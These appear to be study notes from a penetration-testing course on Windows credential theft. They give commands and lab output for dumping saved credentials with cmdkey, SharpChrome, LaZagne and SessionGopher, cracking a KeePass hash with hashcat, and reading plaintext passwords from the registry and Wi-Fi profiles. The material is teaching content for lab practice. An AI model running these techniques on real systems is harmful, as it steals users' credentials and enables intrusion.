# Further Credential Theft

## Further Credential Theft

## **Cmdkey Saved Credentials**

### **Listing Saved Credentials**

The cmdkey command can be used to create, list, and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password.

```powershell
C:\htb> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
```

> we found credential stored for user call `bob` to connect on `TERMSRV/SQL01`

#### reuse to this credential

```powershell
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

***

## **Browser Credentials**

### **Retrieving Saved Credentials from Chrome**

Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.

```powershell
PS C:\htb> .\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.7.0

[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user

[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0

--- Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,**Welcome1**
```

***

## **Password Managers**

Many companies provide password managers to their users. This may be in the form of a desktop application such as `KeePass`, a cloud-based solution such as `1Password`, or an enterprise password vault such as `Thycotic` or `CyberArk`.

we can use a tool such as [keepass2john](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py) to extract the password hash and run it through a password cracking tool such as [Hashcat](https://github.com/hashcat) or [John the Ripper](https://github.com/openwall/john).

### **Extracting KeePass Hash**

First, we extract the hash in Hashcat format using the `keepass2john.py` script.

```bash
irix@htb[/htb]$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 

ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154
```

### **Cracking Hash Offline**

Hash mode 13400 for KeePass.

```bash
irix@htb[/htb]$ hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507po
* Keyspace..: 14344385

$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panther1
                                                 
```

***

## **Email**

If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).

***

## **More Fun with Credentials**

### **Running All LaZagne Modules**

hen all else fails, we can run the [LaZagne](https://github.com/AlessandroZ/LaZagne) tool in an attempt to **retrieve credentials from a wide variety of software**. Such software includes **web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.**

```powershell
S C:\htb> .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Credman passwords -----------------

[+] Password found !!!
URL: dev01.dev.inlanefreight.local
Login: jordan_adm
Password: ! Q A Z z a q 1

[+] 2 passwords have been found.

For more information launch it again with the -v option

elapsed time = 5.50499987602
```

### **Running SessionGopher as Current User**

We can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher) to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials.

Run it with local Administrator

```powershell
PS C:\htb> Import-Module .\SessionGopher.ps1
 
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
 
          o_
         /  ".   SessionGopher
       ,"  _-"
     ,"   m m
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com
 
[+] Digging on WINLPE-SRV01...
WinSCP Sessions
 
 
Source   : WINLPE-SRV01\htb-student
Session  : Default%20Settings
Hostname :
Username :
Password :
 
 
PuTTY Sessions
 
 
Source   : WINLPE-SRV01\htb-student
Session  : nix03
Hostname : nix03.inlanefreight.local
 
```

***

## **Clear-Text Password Storage in the Registry**

### **Enumerating Autologon with reg.exe**

```powershell
C:\htb>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    <SNIP>
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    **DefaultPassword    REG_SZ    HTB_@cademy_stdnt!**
```

### **Putty**

For Putty sessions utilizing a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.

```powershell
# enumerate the available saved sessions
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

#  we look at the keys and values of the discovered session "kali%20ssh":
PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
  <SNIP>
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    **ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!**    
```

***

## **Wifi Passwords**

### **Viewing Saved Wireless Networks**

```powershell
C:\htb> netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : Smith Cabin
    All User Profile     : Bob's iPhone
    All User Profile     : EE_Guest
    All User Profile     : EE_Guest 2.4
    All User Profile     : ilfreight_corp
```

### **Retrieving Saved Wireless Passwords**

```powershell
C:\htb> netsh wlan show profile ilfreight_corp key=clear

Profile ilfreight_corp on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : ilfreight_corp
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "ilfreight_corp"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Presecm
Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default
```
